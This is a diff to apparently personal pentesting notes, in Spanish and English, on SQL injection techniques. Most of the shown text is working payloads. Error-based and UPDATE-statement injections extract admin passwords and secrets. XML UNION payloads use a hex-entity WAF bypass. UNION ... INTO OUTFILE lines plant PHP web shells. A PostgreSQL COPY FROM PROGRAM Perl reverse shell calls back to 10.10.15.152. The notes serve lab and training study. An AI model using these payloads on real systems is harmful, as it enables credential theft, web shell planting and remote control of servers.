@@ -18,7 +18,6 @@
 	- Boolean based
 	- Time based
 - Out-of-band
-
 ### In-band
 Se llama "In-band" porque utilizas **el mismo canal de comunicación** para lanzar el ataque y para recibir los resultados. Es decir, los datos aparecen directamente en la página web que estás viendo.
 #### Union based
@@ -45,9 +44,6 @@ For a `UNION` query to work, two key requirements must be met:
 ```
 
 #### Error based
-This type of Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.
-To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
-
 ```java
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
@@ -66,21 +62,18 @@ BGUyaVUGbC3qUtH' and substring((select password from users where username='admin
 'and (SELECT CASE WHEN (username='administrator' and length(password) >4) THEN TO_CHAR(1/0) ELSE 'a' END FROM users) = 'a
 ```
 
-Documentacion de comandos para las los diferentes gestores de DB: 
-https://portswigger.net/web-security/sql-injection/cheat-sheet
-[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
-https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html
-[3306 - Pentesting Mysql](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html#3306---pentesting-mysql)
-[5432,5433 - Pentesting Postgresql](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
-https://www.sqlinjection.net/
+#### SQL injection in different contexts
+```sql
+<storeId>1+1</storeId>
+<storeId>1 UNION SELECT NULL</storeId>
+# bypass the WAF
+<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
+```
 
-Labs github
-https://github.com/Audi-1/sqli-labs
 
 ### SQLITE
-
 Injection Attack on an UPDATE Statement
-We will now enumerate the database via the UPDATE statement on the profile page. We will assume we have no prior knowledge of the database. By looking at the web page's source code, we can identify potential column names by looking at the name attribute.
 ```java
 # MySQL and MSSQL
 ',nickName=@@version,email='
@@ -98,16 +91,22 @@ We will now enumerate the database via the UPDATE statement on the profile page.
 # Group concat
 ',nickName=(SELECT group_concat(	id || "," || 	author || "," || secret || ":") from secrets),email='
 ```
----funciona los tres
+
+```java
+# funciona los tres
 ') union select "","", "<?php system($_GET['cmd']); ?>", "" into outfile  '/var/www/chattr-prod/shell17.php' -- -
 ') union select '','','',"<?php system($_REQUEST[0]); ?>" into outfile  '/var/www/chattr-prod/shell18.php' -- -
 ') union select '<?php','',"system($_REQUEST['cmd']); ","?>" into outfile  '/var/www/chattr-prod/shell15.php' -- -
-note: debe ser junto `<?php` 
-
-<? php system ($_REQUEST[0]); ?>
-select '<? php $_GET['cmd'] ?> ' into outfile  "/var/www/chattr-prod/whell.php"
-
+```
 
 ```bash
 COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.15.152:333");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
+
+Documentacion de comandos para las los diferentes gestores de DB: 
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
+https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html
+[3306 - Pentesting Mysql](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html#3306---pentesting-mysql)
+[5432,5433 - Pentesting Postgresql](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
+https://www.sqlinjection.net/
